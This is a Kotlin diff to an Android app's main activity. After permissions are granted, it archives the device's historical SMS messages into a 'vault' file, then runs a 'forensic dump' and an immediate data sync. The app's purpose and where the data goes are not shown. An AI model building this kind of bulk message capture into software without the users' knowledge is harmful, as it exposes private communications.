@@ -181,7 +181,9 @@ class MainActivity : ComponentActivity() {
             
             // ROBUSTNESS: Trigger the first high-quality dump immediately upon setup completion
             kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                DebugLogger.log("SYSTEM", "Permissions finalized. Triggering first forensic dump...")
+                DebugLogger.log("SYSTEM", "Permissions finalized. Archiving Historical SMS & triggering dump...")
+                // Create the one-time vault file
+                PhoneManager.vaultHistoricalSms(ctx)
                 DumpManager.createDailyDump(ctx)
                 triggerImmediateDataSync()
             }
